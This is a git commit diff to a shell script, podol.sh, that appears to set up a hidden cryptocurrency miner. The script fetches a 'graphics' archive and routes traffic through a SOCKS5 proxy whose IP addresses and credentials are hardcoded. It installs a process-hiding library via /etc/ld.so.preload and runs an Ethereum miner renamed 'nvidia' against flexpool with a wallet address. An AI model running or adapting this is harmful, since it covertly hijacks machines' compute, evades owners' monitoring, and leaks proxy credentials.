58c3d8ead3e9d6148a54ac28c657dfe0177b7547
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-05-19 12:37:48 +0700

    Update podol.sh

--- podol.sh
+++ podol.sh
@@ -9,11 +9,11 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233 
-loglevel = 1 
-socks5 = 143.198.171.112:1080
-socks5_username = mikrotik999 
-socks5_password = Elibawnos 
+listen = :2233
+loglevel = 1
+socks5 = 154.92.127.248:5907
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-east.nicehash.com:3353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.A1 --ethstratum ETHPROXY
+./graftcp/graftcp ./nvidia -a ETHASH --pool eth-hk.flexpool.io:5555 --tls on --user 0xa8182456995a5b33df2907ddcaae9ad2a50b42a0 --worker PRABU --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
